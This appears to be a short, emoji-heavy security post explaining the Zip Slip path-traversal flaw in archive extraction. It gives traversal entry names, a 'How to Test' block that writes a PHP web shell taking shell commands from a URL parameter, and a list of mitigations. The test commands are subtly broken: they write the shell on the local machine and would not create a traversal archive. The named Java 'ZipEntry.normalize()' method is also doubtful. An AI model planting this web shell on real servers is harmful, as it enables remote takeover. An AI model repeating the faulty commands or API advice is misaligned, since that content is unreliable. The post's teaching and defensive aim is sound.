# 🧠 Zip Slip → Arbitrary File Write Exploit

Ever heard of one ZIP file owning the whole server? Let me show you how 👇

## 🔍 What is Zip Slip?

It’s a vulnerability that occurs when:
1️⃣ A web app extracts user-uploaded `.zip` archives  
2️⃣ It doesn’t sanitize the internal file paths  
3️⃣ The `.zip` contains files like:

```
../../../../etc/passwd
../../../../var/www/html/shell.php
```

### Result? 💥
- ➡️ Overwrite system files  
- ➡️ Drop backdoors  
- ➡️ Gain RCE  
- ➡️ Or crash the app with DoS  

## ⚠️ Real-World Impact

- 💎 Web shell planted in a public directory  
- 💎 Defacing websites  
- 💎 Privilege escalation or full server takeover  

## 📁 How to Test

Create a `.zip` archive with:

```bash
mkdir test && cd test
echo "<?php system(\$_GET['cmd']); ?>" > ../../../../var/www/html/shell.php
zip -r payload.zip *
```

Upload to the app. If it extracts without sanitization → **RCE 🎯**

## 🛡 Mitigation

✅ Sanitize extracted file paths  
✅ Use secure zip libraries (e.g., Java’s `ZipEntry.normalize()`)  
✅ Deny path traversal (`../`) in filenames

💡 Stay sharp: Not all uploads are what they seem. Even a `.zip` can be lethal.
